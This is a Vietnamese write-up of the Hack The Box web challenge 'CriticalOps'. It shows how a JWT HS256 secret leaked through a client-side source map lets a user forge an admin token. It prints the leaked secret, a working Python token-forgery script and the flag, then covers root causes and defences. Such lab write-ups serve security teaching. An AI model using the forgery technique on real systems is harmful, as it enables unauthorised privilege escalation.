---
title: "CriticalOps"
description: "Làm giả JWT HS256 để thay đổi role và truy cập chức năng quản trị."
platform: "Hack The Box"
category: "Web"
difficulty: "Medium"
publishedAt: 2026-08-08
tags: ["web", "jwt", "hs256", "source-map", "authentication", "authorization"]
language: "vi"
translationKey: "hack-the-box/critical-ops"
draft: false
featured: false
cover: "/images/critical-ops/critical-ops-05.png"
---

> Write-up này được thực hiện trong môi trường lab có kiểm soát. Chỉ áp dụng các kỹ thuật bên dưới trên hệ thống mà bạn được phép kiểm thử.

## Tổng quan

CriticalOps là một dashboard quản lý sự cố có khu vực **Admin Panel**. Ứng dụng lưu JWT ở phía client và dùng claim `role` để quyết định quyền truy cập. Mục tiêu là biến tài khoản thông thường thành admin bằng cách tạo lại một token hợp lệ.

Lỗi nằm ở việc JWT secret được đưa vào bundle phía client/source map. Vì token sử dụng HS256, secret này đủ để ký lại token sau khi thay đổi payload.

## Phân tích JWT

JWT gồm ba phần, ngăn cách bởi dấu chấm:

```text
Header.Payload.Signature
```

- `Header` chứa loại token và thuật toán ký, ở đây là `HS256`.
- `Payload` chứa các claim như `userId`, `username`, `role`, `iat` và `exp`.
- `Signature` giúp server kiểm tra token có bị sửa hay không.

Header và payload chỉ được Base64URL encode, không phải mã hóa, nên có thể đọc được. Tuy nhiên, sửa payload mà không tạo signature mới sẽ làm token không hợp lệ.

## Giải pháp

### 1. Tìm token xác thực

Sau khi đăng nhập, mở DevTools và kiểm tra cookie hoặc local storage. Ứng dụng lưu token dưới key `authToken`. Sao chép token để phân tích cục bộ; không cần gửi token thật lên dịch vụ bên thứ ba.

### 2. Đọc source map để tìm secret

Trong tab **Sources**, tìm `JWT_SECRET`. Source map trỏ tới file `jwt.ts`, trong đó secret bị hard-code:

![DevTools cho thấy authToken và kết quả tìm JWT_SECRET](/images/critical-ops/critical-ops-01.png)

```javascript
const JWT_SECRET = 'SecretKey-CriticalOps-2025';
```

![Secret JWT xuất hiện trong source map](/images/critical-ops/critical-ops-02.png)

Đây là lỗi thiết kế nghiêm trọng: mọi secret dùng để ký token phải nằm ở server, không được đóng gói vào JavaScript gửi cho client.

### 3. Giữ claim và đổi role

Đọc token hiện tại, giữ lại các claim nhận dạng và thời hạn, sau đó đổi `role` thành `admin`. Đoạn script dưới đây ký lại token bằng HMAC-SHA256:

![JWT được decode với role admin và các claim liên quan](/images/critical-ops/critical-ops-03.png)

```python
import base64
import hashlib
import hmac
import json

token = "PASTE_AUTH_TOKEN_HERE"
secret = b"SecretKey-CriticalOps-2025"

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=")

header_b64, payload_b64, _ = token.split(".")
payload = json.loads(base64.urlsafe_b64decode(payload_b64 + "=="))
payload["role"] = "admin"

new_payload_b64 = b64url(json.dumps(
    payload, separators=(",", ":")
).encode())
signing_input = header_b64.encode() + b"." + new_payload_b64
signature = b64url(hmac.new(
    secret, signing_input, hashlib.sha256
).digest())

forged_token = signing_input.decode() + "." + signature.decode()
print(forged_token)
```

Thay giá trị `authToken` bằng token mới rồi tải lại dashboard. Claim `role=admin` được server chấp nhận vì chữ ký mới hợp lệ, từ đó khu vực Admin Panel xuất hiện.

![JWT signature được tạo lại bằng secret của challenge](/images/critical-ops/critical-ops-04.png)

### 4. Lấy flag

Trong Admin Panel, danh sách incident chứa bản ghi có tiêu đề là flag:

```text
HTB{Wh0_Put_JWT_1n_Cl13nt_S1d3_Im4g}
```

![Flag xuất hiện trong danh sách incident của Admin Panel](/images/critical-ops/critical-ops-05.png)

## Nguyên nhân gốc

Có hai vấn đề kết hợp với nhau:

1. Secret HS256 được gửi xuống client thông qua bundle/source map.
2. Server tin claim `role` trong token mà không có cơ chế thu hồi token hoặc kiểm soát bổ sung khi secret bị lộ.

JWT không mã hóa payload. Vì vậy, Base64URL không phải là biện pháp bảo mật và không thể dùng để che giấu quyền hoặc secret.

## Phòng thủ

- Chỉ ký và xác minh JWT ở server; không đưa `JWT_SECRET` vào client bundle, source map hoặc biến môi trường được expose cho frontend.
- Dùng secret ngẫu nhiên, đủ dài và lưu trong secret manager; luân chuyển secret sau khi có dấu hiệu lộ lọt.
- Allowlist thuật toán (`HS256` hoặc thuật toán được chọn) và từ chối token có `alg` ngoài dự kiến.
- Không dùng claim client-controlled làm nguồn duy nhất để quyết định quyền. Với thao tác nhạy cảm, kiểm tra role từ server-side session hoặc database.
- Đặt thời hạn ngắn, hỗ trợ revoke/rotation và bảo vệ cookie bằng `HttpOnly`, `Secure` và `SameSite` phù hợp.
- Tắt source map trong production hoặc bảo đảm source map không chứa secret và thông tin nhạy cảm.

## Bài học

Khi thấy JWT ở client, cần phân biệt việc decode payload với việc tạo token hợp lệ. Với HS256, secret bị lộ biến mọi claim thành dữ liệu có thể giả mạo; kiểm tra bundle và source map thường là bước quyết định.
